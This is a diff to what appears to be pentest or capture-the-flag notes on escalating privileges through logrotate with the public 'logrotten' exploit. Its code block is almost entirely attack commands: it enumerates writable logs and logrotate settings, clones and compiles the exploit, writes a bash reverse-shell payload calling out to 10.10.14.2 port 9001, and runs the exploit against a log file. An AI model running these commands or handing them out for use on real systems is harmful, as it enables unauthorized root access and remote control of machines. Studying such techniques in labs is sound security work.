@@ -250,21 +250,20 @@ screen -ls # screen itself is setuid, so...
 ```powershell
 logrotate --help
 
+find /var/log -type f -writable 2>/dev/null
+
 cat /etc/logrotate.conf
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+
 sudo cat /var/lib/logrotate.status
+
 ls /etc/logrotate.d/
 
-cat /etc/logrotate.d/dpkg
-
-git clone https://github.com/whotwagner/logrotten.git
+git clone https://github.com/whotwagner/logrotten
 cd logrotten
 gcc logrotten.c -o logrotten
 
 echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
 
-grep "create\|compress" /etc/logrotate.conf | grep -v "#"
-
-nc -nlvp 9001
-
-./logrotten -p ./payload /tmp/tmp.log
+./logrotten -p ./payload /var/log/some_log_file
 ```
